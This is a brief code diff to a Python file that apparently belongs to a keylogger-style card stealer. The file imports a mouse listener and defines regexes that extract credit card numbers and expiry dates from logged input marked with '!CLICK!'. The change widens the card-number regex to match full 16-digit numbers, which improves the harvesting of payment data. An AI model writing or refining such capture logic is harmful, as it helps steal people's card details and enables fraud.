@@ -6,7 +6,7 @@ import re
 from pynput.mouse import Listener
 import ctypes
 
-CREDIT_CARD_NUMBER_REGEXP = re.compile("[0-9]{4}[ ]?[0-9]{4}[ ]?[0-9]{4}")
+CREDIT_CARD_NUMBER_REGEXP = re.compile("[0-9]{4}[ ]?[0-9]{4}[ ]?[0-9]{4}[ ]?[0-9]{4}")
 CREDIT_CARD_EXPIRY_REGEXP = re.compile(
     "[\t]?(?:!CLICK!)?[\n]?([0-9]{2}[\t ,\\\/]?[0-9]{2})"
 )
